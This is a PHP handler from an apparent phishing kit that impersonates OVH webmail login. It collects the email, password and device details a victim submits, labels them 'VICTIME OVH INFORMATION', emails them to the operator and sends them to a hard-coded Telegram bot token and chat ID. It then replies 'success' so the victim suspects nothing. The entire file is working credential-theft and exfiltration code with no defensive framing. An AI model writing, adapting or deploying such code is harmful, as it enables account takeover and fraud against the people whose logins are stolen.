<?php

include('get_browser.php');
include('get_ip.php');
include('Email.php');
$ip= $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');	
if(isset($_POST) ){

$data = array();	
	
if ($_POST['EMAIL'] == "" || $_POST['PASSE'] == "" || $_POST['DEVICE'] == "") {
  
  

$data['statut'] = 'error'; 
$data['title'] = 'error';
$data['resultat']="no data entered";
  
  }else{
$DCH_MESSAGE .= "
+=======VICTIME OVH INFORMATION========+
| IP INFO          =".$ip."    
| TIME/DATE        =".$TIME_DATE."
| BROWSER          =".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])." 
+==========LOGIN OVH MAIL========+
| DEVICE USER AGENT      =  ".$_POST['DEVICE']."
| UTILISATEUR      =  ".$_POST['EMAIL']."
| MOT DE PASSE     =  ".$_POST['PASSE']."
| LIEN PANEL   =  ".$rtt."
+===============================+\n";

$DCH_SUBJECT .= "LOGIN OVH MAIL";
$DCH_HEADERS .= "From: TCHE-Dev<cantact>";
$DCH_HEADERS .= "TCHE-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
file_get_contents("https://api.telegram.org/bot5674428987:AAGFbrYYuFhMhnQv0cLrXCZNkvYRHgUQ1MA/sendMessage?chat_id=1774172947&text=".urlencode($DCH_MESSAGE)."" );



$data['statut'] = 'success'; 
$data['title'] = 'succès'; 
$data['resultat']="valider";

}

echo json_encode($data);

}


